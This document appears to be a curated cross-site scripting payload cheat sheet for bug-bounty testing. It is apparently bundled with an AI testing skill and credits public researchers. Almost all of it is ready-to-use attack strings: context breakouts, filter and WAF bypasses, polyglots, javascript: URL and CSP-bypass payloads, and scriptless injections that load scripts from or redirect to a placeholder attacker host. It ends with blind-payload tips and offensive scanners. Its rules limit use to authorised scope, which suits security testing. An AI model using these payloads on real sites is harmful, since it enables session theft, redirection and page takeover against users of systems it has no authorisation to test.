# Community XSS Payloads & Tips (curated)

Collected from the notes supplied with this skill (brutelogic, zseano, Gareth Heyes, Masato Kinugawa, kunalp94, intigriti/Bugcrowd tips, s0md3v AwesomeXSS, RenwaX23, payloadbox, TheKingOfDuck, SecLists XSS-OFJAAAH) and grouped by what they get past.

Rules for using them:
- Swap `alert(1)` / `alert(document.cookie)` for `alert(document.domain)` in reports. It proves which origin ran the code, and it does not display session data.
- Any external host in a payload must be **your own**. Payloads from public posts with numeric-IP or third-party collectors (`import('//<number>/')`, `xss.ht`, `js.rip`, `xss.report` IDs) belong to someone else. Replace them with `YOUR.HOST`.
- Do not search the web for other researchers' collector domains to find "private programs". That is outside your authorisation.
- `xss_payloads.py` generates most of these per context. The list below keeps the originals for manual Burp work.

## Breaking out of contexts

```text
"><svg/onload=alert(document.domain)>
'"><img src=x onerror=alert(document.domain)>
"></\/\</script><script>alert(document.domain)</script>
</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
--!><Svg/Onload=confirm(document.domain)>                 # inside an HTML comment
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
'"</Script><Html Onmouseover=(alert)(1) //                # HTML, inline-attribute and JS-block contexts
\";alert('XSS');//                                         # JS string, backslash not escaped
'-alert(1)-'    '^alert()^'    '/alert()/'    ';alert();'  # JS string operators
"-alert`1`,"                                               # inside window.location.replace("...") with ) filtered
*/alert(1)</script><script>/*                              # inside a JS comment (file upload case)
```

## No `>`, no closing tag

```text
<svg onload='alert(1)'
<svg onload=alert(1)//
<svg onload=alert(1)<!--
<svg onload=alert(1)%0A      (also %0C %0D %09 %20)
hhh<img src="#" onmouseenter="prompt('XSS')" gggg
<meter onmouseover="alert(1)"
```

## Attribute tricks

```text
"autofocus/onfocus=alert(1)//
"type="text"autofocus onfocus="alert(1)"           # hidden input: set type first (URL-encode the = signs)
" onfocus="alert(1)" autofocus="
"onfocus="alert`1`"autofocus="                     # parentheses filtered
x onfocus=alert(0) autofocus                        # unquoted value: a space is enough, even after htmlspecialchars
<a href=x onfocus=alert(23) name=jj>                # reached via #jj fragment
ononmouseover=mouseover=onmouseover="alert()"       # recursive keyword strip
onffocusofocuscfocusufocuss="prompt(1)"             # filter replaces 'focus' with nothing
<div/onmouseover='alert(1)'> style="x:">
<img src=`xx:xx`onerror=alert(1)>
<img ="=" title="><img src=1 onerror=alert(1)>">
```

## No parentheses, spaces or quotes

```text
<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
<svg/onload=throw/**/Uncaught=window.onerror=eval,";alert\501\51">
<img src="X" onerror=top[8680439..toString(30)](1337)>
<img src=x onerror="[]['constructor']['constructor']('ale'+'rt(0)')()">
<svg onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<sVg/oNloAd="JaVaScRiPt:/**\/*\'/"\eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))">
<iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))>
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>            # uppercase-only filters
```

## Uncommon events and tags (WAF bypass)

```text
"><x/Onpointerrawupdate=confirm(document.domain)>
<x onauxclick=alert(document.domain)>click            # replace public import('//NUMBER/') collectors with your own host
"><details/open/ontoggle=prompt(document.domain)>
‟><marquee/onstart=confirm(1)>
<body ontouchstart=alert(1)>  <body ontouchend=alert(1)>  <body ontouchmove=alert(1)>   # mobile
"><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--
<math><x xlink:href=javascript:confirm`1`>click
<svg><animate onend=alert(1) dur=1s>
<svg><a xml:base="javascript:alert(1)//" href="#"><circle r="100" /></svg>   # Firefox
"><brute+onbeforescriptexecute=a=alert,a(1%26%23x29>  # legacy Firefox
<img src=`%00`&NewLine; onerror=alert`1`&NewLine;
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert`1`&NewLine;>x</a>
<script%0a>alert(1)</script%0a>                        # tag-content strip bypass with line feed
<!----><script>alert(0);</script>
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
```

## Polyglots

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//      # @avlidienbrunn multi-context
'"><svg/onload=prompt(5);>{{7*7}}                                     # SQLi + XSS + SSTI/CSTI triage in one string
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
```

## URL / redirect parameters

```text
javascript:alert()
javascript://%0aalert(1)          javascript://%250aalert(1)   (double decoding)
/x:1/:///%01javascript:alert(document.cookie)/
<a class="w-100" href=javascript:alert(document.cookie) // target=_self target="_blank">
< a href="mailto:a"+/onmouseover=prompt(document.domain)>
```

## HTML injection escalation (scriptless)

```text
<base href=//YOUR.HOST>                                                 # hijacks relative links/scripts
><meta http-equiv="Refresh" content="0; url='https://YOUR.HOST'" />     # HTML injection to redirect
/<div+id=JavaScript>/<marquee onstart=alert`1`>x</marquee>
<a ping="https://YOUR.HOST/1 https://YOUR.HOST/2" href=#>x</a>
</a><a href=https://example.org>Test</a>
```

## CSP and file tricks

```text
<script ?/src="data:+,alert%281%29">/</script>                     # CSP: script-src 'self' data:
?x=<script%20src=data:&x=alert(1);>                                       # parameter concatenation
xss.xml: <?xml version="1.0" encoding="UTF-8"?><html xmlns:html="http://w3.org/1999/xhtml"><html:script>prompt(document.domain);</html:script></html>
<svg onload=alert(1)> as a file EXTENSION when the filename is validated but the extension is not
```

## Tips collected

- Tomcat/JSP pages with no parameters accept path parameters: `/test.jsp;');alert(1)//`.
- JSON endpoints served as `text/html` reflect special characters. Try appending `.html` to extension-less endpoints, with a parameter.
- Put a blind payload in your User-Agent before filling in contact forms. Blind payloads in app-store reviews reach third-party review tools, which are only in scope if the program says so.
- Split payloads across first and last name: `<img src=x` + `onerror=prompt(0)>`.
- Hidden-field reflection: look for page JS such as `document.getElementById("x").click()` and give your element that id, rather than relying on `accessKey`.
- Order IDs and other "numbers only" fields are often not sanitised.
- `innerHTML` in JS files marks a likely DOM sink (see `dom_sinks.py`).
- Leave cookie pop-ups undismissed while testing: their code may reflect the URL.
- Switch to a mobile User-Agent or other locales: templates differ (XS-56).
- To show impact, check where the session lives (cookie vs `localStorage`) and report that, rather than displaying a real token.
- Stored HTML injection in `<head>` (often via cache poisoning) can inject a meta CSP that disables the page's scripts.

## Tools

dalfox (`hahwul/dalfox`), KNOXSS, XSStrike, Burp DOM Invader, Reflector, ParamSpider/gau + `gf xss`, kxss, Gxss, airixss, XSScope, self-hosted XSS Hunter / interactsh, Retire.js, CSP Evaluator. Run scanners only against scope-checked targets, at low rates.
